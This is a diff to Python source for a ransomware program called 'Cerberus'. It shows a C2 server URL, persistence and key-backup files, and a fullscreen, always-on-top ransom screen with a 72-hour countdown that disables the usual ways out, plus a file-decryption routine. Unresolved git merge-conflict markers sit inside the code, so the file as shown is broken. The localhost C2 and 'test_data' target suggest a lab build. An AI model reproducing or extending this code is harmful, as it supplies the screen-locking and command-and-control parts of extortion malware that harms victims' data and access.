@@ -28,7 +28,7 @@ FQIDAQAB
 -----END PUBLIC KEY-----"""
 
 C2_SERVER_URL = "http://127.0.0.1:5000" # Change if your C2 is hosted elsewhere
-TARGET_DIRECTORY = os.path.join(os.path.expanduser("~"), "test_data")
+TARGET_DIRECTORY = os.path.join(os.path.expanduser("."), "test_data")
 LOCK_FILE = os.path.join(TARGET_DIRECTORY, ".cerberus_lock")
 ID_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_id.txt") # PERSISTENCE: Store ID here
 KEY_BACKUP_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_key.bak") # SAFETY: Backup key before check-in
@@ -256,6 +256,7 @@ class RansomwareGUI:
         # Countdown Timer (72 Hours)
         self.time_left = 72 * 3600 
 
+<<<<<<< HEAD
 
         # --- GUI Configuration (Snippet 4 & 1/2) ---
         master.title("RANSOMWARE")
@@ -265,6 +266,17 @@ class RansomwareGUI:
         master.attributes('-fullscreen', True)
         master.attributes('-topmost', True) # Keep on top
         master.overrideredirect(True)  # Remove window decorations
+=======
+        # Kiosk Mode Settings (Linux Optimized)
+        master.title("CERBERUS RANSOMWARE")
+        # On Linux, 'zoomed' state or 'attributes -fullscreen' works. 
+        # But 'overrideredirect' is key to removing window decorations (title bar, borders).
+        master.attributes('-fullscreen', True) 
+        master.overrideredirect(True) # Ensure no window decorations
+        master.attributes('-topmost', True)
+        master.configure(bg='#0a0a0a')
+        master.resizable(False, False)
+>>>>>>> upstream/main
         
         # Disable all common escape methods
         def safe_bind(sequence, func):
@@ -420,6 +432,7 @@ class RansomwareGUI:
         key_b64 = self.key_var.get()
         if not key_b64:
             return
+<<<<<<< HEAD
         
         self.log_message("KEY RECEIVED. STARTING DECRYPTION...", "green")
         
@@ -461,6 +474,35 @@ class RansomwareGUI:
         self.master.grab_release() 
         self.master.protocol("WM_DELETE_WINDOW", self.master.destroy)
         self.master.bind('<Escape>', lambda e: self.master.destroy())
+=======
+        try:
+            key = base64.b64decode(key_b64)
+            decrypted_files = 0
+            for root, _, files in os.walk(TARGET_DIRECTORY):
+                for file in files:
+                    if file.endswith(ENCRYPTED_EXTENSION):
+                        file_path = os.path.join(root, file)
+                        if decrypt_file_aes_gcm(file_path, key):
+                            decrypted_files += 1
+            
+            # Clean up persistence files
+            if os.path.exists(LOCK_FILE): os.remove(LOCK_FILE)
+            if os.path.exists(ID_FILE): os.remove(ID_FILE)
+            if os.path.exists(KEY_BACKUP_FILE): os.remove(KEY_BACKUP_FILE)
+            
+            self.status_label.config(text=f"SUCCESS! {decrypted_files} files decrypted.", fg='#4dff88')
+            self.heartbeat_thread_running = False
+            self.decrypt_button.config(state='disabled')
+            
+            # Allow closing
+            self.master.grab_release() # Release input grab
+            self.master.destroy() # Force destroy without waiting for protocols
+            sys.exit() # Ensure script terminates fully
+            
+        except Exception as e:
+            log_error(f"Decryption failed: {e}")
+            self.status_label.config(text="ERROR: Decryption failed.", fg='red')
+>>>>>>> upstream/main
 
 # --- Main Execution ---
 if __name__ == "__main__":
